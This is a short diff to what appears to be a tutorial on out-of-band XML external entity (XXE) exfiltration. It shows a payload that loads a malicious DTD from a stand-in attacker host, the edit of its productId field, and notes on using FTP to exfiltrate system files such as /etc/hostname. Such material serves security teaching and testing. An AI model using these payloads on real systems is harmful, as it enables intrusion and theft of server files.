@@ -18,7 +18,7 @@ Finally, the attacker must submit the following XXE payload to the vulnerable ap
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
 "http://web-attacker.com/malicious.dtd"> %xxe;]>
-<stockCheck><productId>&xxe;</productId></stockCheck>
+<stockCheck><productId>299</productId></stockCheck>
 ```
 ## Note
 This technique might not work with some file contents, including the newline characters. This is because some XML parsers fetch the URL defined in the external entity using an API that validates the whitelisted characters against the URL string. In this situation, it might possible to use the FTP protocol instead. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead.
